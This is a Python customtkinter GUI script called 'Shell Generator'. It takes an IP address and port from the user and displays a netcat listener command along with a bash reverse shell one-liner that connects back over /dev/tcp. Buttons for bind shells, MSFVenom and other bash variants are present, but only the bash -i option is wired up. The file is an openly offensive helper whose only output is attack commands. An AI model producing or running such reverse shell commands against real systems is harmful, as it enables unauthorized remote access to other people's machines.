import customtkinter as cutk

PORT = int()
IP = str("Your IP")

cutk.set_appearance_mode("dark")
cutk.set_default_color_theme("blue")

app = cutk.CTk()
app.geometry("1100x1100")
app.title("Shell Generate V1")

app.grid_rowconfigure(0, weight=1)
app.grid_columnconfigure(0, weight=1)

def get_the_port_from_user(event):
    global PORT
    PORT = port_entry.get()
    print(f"nc -lvnp {PORT}")
    listent_label.configure(text=f"nc -lvnp {PORT}")
    shell_label.configure(text=f"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1")

def get_the_ip_from_user(event):
    global IP
    IP = ip_entry.get()
    print(f"IP input {IP}")
    shell_label.configure(text=f"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1")

def ret_bash_i():
    shell_label.configure(text=f"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1")

# Create a frame 
main_frame = cutk.CTkFrame(master=app) 
main_frame.grid(pady=30,padx=30, row=0, column=0, sticky='nsew')

# Set the label inside the frame
main_label = cutk.CTkLabel(master=main_frame, text='Shell Generator', font=("Roboto", 32))
main_label.grid(pady=10, padx=10,row=0, columnspan=2, sticky='nsew')

# Crează un frame interior în cadrul frame-ului exterior
ip_port_frame = cutk.CTkFrame(master=main_frame, corner_radius=10)
ip_port_frame.grid(pady=10,padx=10, row=1, column=0, ipadx=50)

ip_port_label = cutk.CTkLabel(master=ip_port_frame, text="IP & Port")
ip_port_label.grid(padx=10, pady=10, row=0, column=0)

ip_entry = cutk.CTkEntry(master=ip_port_frame, placeholder_text="Enter IP")
ip_entry.grid(padx=10, pady=10,row=1, column=0)
ip_entry.bind("<Return>", get_the_ip_from_user)

port_entry = cutk.CTkEntry(master=ip_port_frame, placeholder_text="Port")
port_entry.grid( padx=10, pady=10, row=1, column=1)
port_entry.bind("<Return>", get_the_port_from_user)

listent_frame = cutk.CTkFrame(master=main_frame, corner_radius=10,)
listent_frame.grid(pady=10,padx=10,row=1, column=1,ipadx=70)

listent_label = cutk.CTkLabel(master=listent_frame, text="Listener")
listent_label.grid(pady=10, padx=10)

listent_label = cutk.CTkLabel(master=listent_frame, width=220, text=f"nc -lvnp {PORT}" )
listent_label.grid()


shell_frame = cutk.CTkFrame(master=main_frame, corner_radius=10)
shell_frame.grid(row=2,columnspan=2, sticky='nsew', padx=10, pady=10)

revers_shell = cutk.CTkButton(master=shell_frame, text="Reverse",fg_color="gray", hover_color="blue", corner_radius=10)
revers_shell.grid(row=0, column=0)
bind_shell = cutk.CTkButton(master=shell_frame, text="Bind",fg_color="gray", hover_color="blue", corner_radius=10)
bind_shell.grid(row=0, column=1)
MSF_venom = cutk.CTkButton(master=shell_frame, text="MSFVenom",fg_color="gray", hover_color="blue", corner_radius=10)
MSF_venom.grid(row=0, column=2)
scrollable_frame = cutk.CTkScrollableFrame(master=shell_frame, width=150, height=150)
scrollable_frame.grid()

bash_i = cutk.CTkButton(master=scrollable_frame,command=ret_bash_i, text=f"Bash -i",fg_color="gray", hover_color="red" )
bash_196 = cutk.CTkButton(master=scrollable_frame, text=f"Bash 196",fg_color="gray", hover_color="red" )
bash_read_line = cutk.CTkButton(master=scrollable_frame, text=f"Bash read line",fg_color="gray", hover_color="red" )
bash_5 = cutk.CTkButton(master=scrollable_frame, text=f"Bash 5",fg_color="gray", hover_color="red" )

shell_label = cutk.CTkLabel(master=shell_frame, text='Enter yout port and IP!!!', font=("Aria", 20))
shell_label.grid(row=1, column=1)

bash_i.grid(padx=3, pady=3)
bash_196.grid(padx=3, pady=3)
bash_read_line.grid(padx=3, pady=3)
bash_5.grid(padx=3, pady=3)

app.mainloop()
